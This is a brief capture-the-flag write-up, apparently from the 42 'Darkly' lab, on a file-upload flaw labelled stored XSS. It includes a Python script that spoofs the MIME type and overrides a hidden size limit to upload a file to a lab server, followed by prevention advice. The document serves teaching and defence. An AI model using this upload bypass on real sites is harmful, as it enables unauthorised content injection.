# Stored XSS

## Description
Embed JavaScript in an SVG or HTML file to execute in users’ browsers.

## BornToSec
The upload image page contain a form with a hidden input to set the max file size and there is another input for the file. So the file cant be uploaded. 

Thats why i wrote a python script to change the max file size to 100000000 and upload a readme to simulate the attack.

```python
import requests

def upload_image(url, path):
    data = {'Upload': 'Upload', 'MAX_FILE_SIZE': 100000000}
    files = {'uploaded': (path, open(path, 'rb'), "image/jpeg")}
    request = requests.post(url, files=files, data=data)
    for line in request.text.splitlines():
        if 'flag' in line:
            print(line)


upload_image("http://10.11.249.222/?page=upload", "/Users/nesta/Desktop/42/darkly/README.md")
```

## How to prevent it 
- Validate file types and extensions on both client and server sides.
- Save files outside of web-accessible directories.
- Rename uploaded files to random names and avoid using user-supplied filenames.
- Implement Content Security Policies (CSP) to minimize risks from uploaded content.